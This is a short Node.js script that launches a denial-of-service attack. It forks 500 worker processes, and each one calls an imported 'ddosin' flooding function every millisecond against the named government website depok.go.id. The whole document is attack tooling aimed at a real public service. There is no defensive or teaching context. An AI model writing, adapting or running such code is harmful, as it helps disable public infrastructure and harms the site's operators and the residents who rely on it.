let ddosin = require("./lol.js")
const cluster = require('cluster');

function attack(){
ddosin(`https://depok.go.id/`)
}

if (cluster.isMaster) {
  for (let i = 0; i < 500; i++) {
    cluster.fork();
  }
} else {
  setInterval(attack, 1);
}